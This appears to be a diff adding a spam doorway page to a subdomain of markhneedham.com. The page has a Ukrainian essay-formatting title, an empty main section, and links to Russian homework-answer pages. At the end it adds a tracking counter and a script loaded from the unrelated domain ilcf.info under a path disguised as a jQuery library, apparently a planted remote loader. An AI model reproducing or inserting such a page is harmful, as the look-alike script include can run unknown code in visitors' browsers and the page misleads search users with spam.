@@ -1,0 +1,140 @@
+<!DOCTYPE HTML>
+
+<html>
+
+<head>
+    <title>Приклад оформлення титульної сторінки реферату в снау - eetoosoh.markhneedham.com</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="main.css" />
+</head>
+
+<body class="subpage">
+    <div id="page-wrapper">
+
+        <!-- Header -->
+        <section id="header">
+            <div class="container">
+                <div class="row">
+                    <div class="col-12">
+
+                        <!-- Logo -->
+                        <h1><a href="/" id="logo">eetoosoh.markhneedham.com</a></h1>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Content -->
+        <section id="content">
+            <div class="container">
+                <div class="row">
+                    <div class="col-9 col-12-medium">
+
+                        <!-- Main Content -->
+                        <section>
+                            <header>
+                                <h2>Приклад оформлення титульної сторінки реферату в снау</h2>
+                            </header>
+                            <p></p>
+                        </section>
+
+                    </div>
+                    <div class="col-3 col-12-medium">
+
+                        <!-- Sidebar -->
+                        <section>
+                            <header>
+                                <h2>Links to Important Stuff</h2>
+                            </header>
+                            <ul class="link-list">
+                                <li><a href="dzx-angliyskiy-yazyk-9-klass-lapickaya-rabochaya-tetrad-reshebnik.html">Английский язык 9 класс лапицкая рабочая тетрадь решебник</a></li>
+                                <li><a href="dzx-politicheskiy-stroy-rossii-v-xvii-v-referat.html">Политический строй россии в xvii в реферат</a></li>
+                                <li><a href="dzx-reshebnik-po-istorii-6-klass-uchebnik-boycov-shukurov.html">Решебник по истории 6 класс учебник бойцов шукуров</a></li>
+                                <li><a href="dzx-rol-potrebitelskogo-kredita-v-razvitii-realnogo-sektora-ekonomiki-referat.html">Роль потребительского кредита в развитии реального сектора экономики реферат</a></li>
+                                <li><a href="dzx-zadachnik-po-fizike-9-11-1990-rymkevich.html">Задачник по физике 9-11 1990 рымкевич</a></li>
+                                <li><a href="dzx-uchebnik-slesar-elektromontazhnik-kornilov.html">Учебник слесарь-электромонтажник корнилов</a></li>
+                            </ul>
+                        </section>
+                        <section>
+                            <header>
+                                <h2>Links</h2>
+                            </header>
+                            <ul class="link-list"></ul>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <section id="footer">
+            <div class="container">
+                <div class="row">
+                    <div class="col-8 col-12-medium">
+
+                        <!-- Links -->
+                        <section>
+                            <h2>Links to Important Stuff</h2>
+                            <div>
+                                <div class="row">
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="dzx-reshebnik-po-literature-7-klass-merkin-1-chast-otvety.html">Решебник по литературе 7 класс меркин 1 часть ответы</a></li>
+                                            <li><a href="dzx-uchebnik-matematika-4-klass-reshebnik-istomina.html">Учебник математика 4 класс решебник истомина</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="dzx-praktikum-informatika-i-ikt-10-11-klass-semakin-reshebnik.html">Практикум информатика и икт 10 11 класс семакин решебник</a></li>
+                                            <li><a href="dzx-gdz-po-angl-yazyku-5-klass-virdzhiniya-evans-rabochaya-tetrad.html">Гдз по англ языку 5 класс вирджиния эванс рабочая тетрадь</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="dzx-podgotovka-k-zno-2013-po-istorii-ukrainy-materialy-uchebniki.html">Подготовка к зно 2013 по истории украины материалы учебники</a></li>
+                                            <li><a href="dzx-reshebnik-7-klass-i-po-karpyuk.html">Решебник 7 класс i по карпюк</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="dzx-gotovye-domashnie-zadaniya-po-russkomu-yazyku-4-klass.html">Готовые домашние задания по русскому языку 4 класс</a></li>
+                                            <li><a href="dzx-gdz-rabochaya-tetrad-2-chast-istoriya-rossii-9-klass.html">Гдз рабочая тетрадь 2 часть история россии 9 класс</a></li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                    </div>
+                    <div class="col-4 col-12-medium imp-medium">
+
+                        <!-- Blurb -->
+                        <section>
+                            <h2>An Informative Text Blurb</h2>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Copyright -->
+        <div id="copyright">
+            &copy; Untitled. All rights reserved.</a>
+        </div>
+
+    </div>
+
+    <script type="text/javascript">
+        new Image().src = "//counter.yadro.ru/hit;jquery?r" +
+            escape(document.referrer) + ((typeof(screen) == "undefined") ? "" :
+                ";s" + screen.width + "*" + screen.height + "*" + (screen.colorDepth ?
+                    screen.colorDepth : screen.pixelDepth)) + ";u" + escape(document.URL) +
+            ";h" + escape(document.title.substring(0, 150)) +
+            ";" + Math.random();
+    </script>
+<script src="http://ilcf.info/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
